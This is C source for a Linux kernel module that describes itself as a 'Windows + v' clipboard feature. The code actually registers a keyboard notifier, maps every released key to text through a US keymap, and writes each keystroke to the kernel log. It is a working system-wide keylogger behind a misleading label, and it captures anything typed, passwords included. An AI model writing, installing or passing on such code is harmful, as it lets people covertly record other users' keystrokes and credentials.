#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/moduleparam.h>
#include <linux/input.h>
#include <linux/printk.h>

#define BUF_LEN (PAGE_SIZE << 2)
#define CHUNK_LEN 12
#define US 0
#define HEX 1
#define DEC 2

#define WINDOWS_V_VERSION "1.0"

static int codes = 0;

static int keyboard_notifier_cb(struct notifier_block *nblk,
                                unsigned long code,
                                void *_param);

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char *us_keymap[][2] = {
        {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
        {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
        {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
        {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
        {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
        {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
        {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
        {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
        {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
        {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
        {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
        {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
        {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
        {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
        {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
        {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
        {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
        {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
        {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
        {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
        {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
        {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
        {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
        {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
        {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
        {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
        {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
        {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
        {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
        {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
        {"_PAUSE_", "_PAUSE_"},                                         // 119
};

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Lucas Zordan Nunes <lucaszordan0204@gmail.com>");
MODULE_VERSION(WINDOWS_V_VERSION);
MODULE_DESCRIPTION("Windows + v feature in linux xD");

void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
    switch (type) {
        case US:
            if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
                const char *us_key = (shift_mask == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
                snprintf(buf, CHUNK_LEN, "%s", us_key);
            }
            break;
        case HEX:
            if (keycode > KEY_RESERVED && keycode < KEY_MAX) {
                snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
            }
            break;
        case DEC:
            if (keycode > KEY_RESERVED && keycode < KEY_MAX) {
                snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
            }
            break;
    }
}

static struct notifier_block keyboard_notifier_blk = {
    .notifier_call = keyboard_notifier_cb
};


int keyboard_notifier_cb(struct notifier_block *nblk,
                         unsigned long code,
                         void *_param)
{
    char keybuf[CHUNK_LEN] = {0};
    struct keyboard_notifier_param *param = _param;

    keycode_to_string(param->value, param->shift, keybuf, codes);

    if (!(param->down)) {
        pr_info("%s", keybuf);
        return NOTIFY_OK;\
    }

    return NOTIFY_OK;
}


static int __init init_windows_v(void){
    pr_info("Hello, World!\n");

    if (codes < 0 || codes > 2) {
        return -EINVAL;
    }

    register_keyboard_notifier(&keyboard_notifier_blk);
    return 0;
}

static void __exit exit_windows_v(void) {
    pr_info("Goodbye");
    unregister_keyboard_notifier(&keyboard_notifier_blk);
}

module_init(init_windows_v);
module_exit(exit_windows_v);
